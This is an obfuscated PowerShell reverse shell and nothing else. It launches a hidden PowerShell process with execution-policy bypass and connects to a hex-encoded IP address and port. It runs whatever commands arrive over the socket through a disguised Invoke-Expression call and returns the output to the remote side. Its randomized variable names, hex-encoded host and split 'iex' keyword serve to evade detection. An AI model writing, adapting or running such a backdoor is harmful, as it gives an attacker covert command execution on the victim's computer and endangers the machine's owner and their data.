Start-Process $PSHOME\powershell.exe -ArgumentList {
    -ep bypass -nop
    $fLa8QgX415 = New-Object System.Net.Sockets.TCPClient('0xc0a8d14c', 0xada7)
    $rALGoJ9RIP = $fLa8QgX415.GetStream()
    [byte[]]$W6bUxFE5RV = 0..65535|%{0}

    while (($ERDb8tYKs0 = $rALGoJ9RIP.Read($W6bUxFE5RV, 0, $W6bUxFE5RV.Length)) -ne 0) {
        $1cSCioFkLf = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($W6bUxFE5RV, 0, $ERDb8tYKs0)
        $J4psBspbMW = (i''ex $1cSCioFkLf 2>&1 | Out-String )
        $1MWYX2Z1tE = $J4psBspbMW + '<:lclkqdUSKB:> ' + (pwd).Path + '> '
        $JpDqS5d1PH = ([text.encoding]::ASCII).GetBytes($1MWYX2Z1tE)
        $rALGoJ9RIP.Write($JpDqS5d1PH, 0, $JpDqS5d1PH.Length)
        $rALGoJ9RIP.Flush()
    }

    $fLa8QgX415.Close()
} -WindowStyle Hidden
